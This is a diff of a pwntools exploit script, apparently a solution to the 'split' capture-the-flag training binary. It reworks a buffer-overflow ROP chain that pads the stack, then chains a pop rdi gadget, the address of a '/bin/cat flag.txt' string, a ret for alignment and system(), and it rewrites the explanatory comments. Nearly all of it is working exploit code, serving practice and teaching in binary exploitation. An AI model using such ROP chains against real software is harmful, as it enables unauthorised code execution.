@@ -24,20 +24,22 @@ r = start()
 
 #========= exploit here ===================
 
+junk = b'A' * 32
+rbp = b'B' * 8
 poprdi = rop.rdi.address
 binsh = next(elf.search(b'/bin/cat'))
 system = elf.sym.system
 ret = rop.ret.address
 
-payload = b'A'*40
-#We control the buffer overflow
-#payload += 'BBBBBBB'
-#payload += 'CCCCCCC'
-#We have to find address of pop rdi = ropper --file split --search 'pop rdi'
-payload += p64(poprdi)  #saca lo que sea que este en el stack y hace un pop en el rdi
-payload += p64(binsh)   #now we have to find the addresses of binsh and system
+payload = junk
+payload += rbp
+#We control the return pointer
+
+#We need to find address of pop rdi with command = ropper --file split --search 'pop rdi'
+payload += p64(poprdi)  #the instruction pointer will jump to the address of pop rdi;ret
+payload += p64(binsh)   #the stack pointer will point now to the address of /bin/cat flag.txt
 payload += p64(ret)     #in ubuntu we have to add ret address to aline the stack
-payload += p64(system)
+payload += p64(system)  #this function is useful because here there is a /bin/ls, and we're going to replace it
 
 r.sendlineafter('>', payload)
 #========= interactive ====================
